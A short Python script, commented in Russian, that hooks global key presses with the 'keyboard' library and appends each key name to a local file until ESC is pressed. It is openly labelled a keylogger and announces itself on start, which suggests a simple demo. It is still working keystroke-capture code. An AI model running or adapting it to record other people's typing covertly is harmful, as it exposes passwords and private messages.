import keyboard
import time

log_file = "keylog.txt"

def on_key_event(event):
    with open(log_file, "a") as f:
        f.write(event.name + " ")

if __name__ == '__main__':
    print("Кейлоггер запущен. Нажмите ESC для остановки.")
    keyboard.on_press(on_key_event)
    keyboard.wait("esc")